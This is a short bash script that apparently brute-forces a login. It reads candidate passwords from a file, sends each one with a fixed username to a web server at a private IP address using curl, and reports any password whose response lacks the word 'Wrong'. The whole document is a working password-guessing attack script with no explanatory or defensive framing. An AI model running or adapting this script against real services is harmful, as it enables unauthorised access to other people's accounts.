server="192.168.3.151"
passwords=$(cat passwords.txt)

for i in $passwords
do
	[[ $(curl -s $server?"username=furkan.paligu&password="$i | grep -c "Wrong") < 1 ]] && echo "found, $i"
done
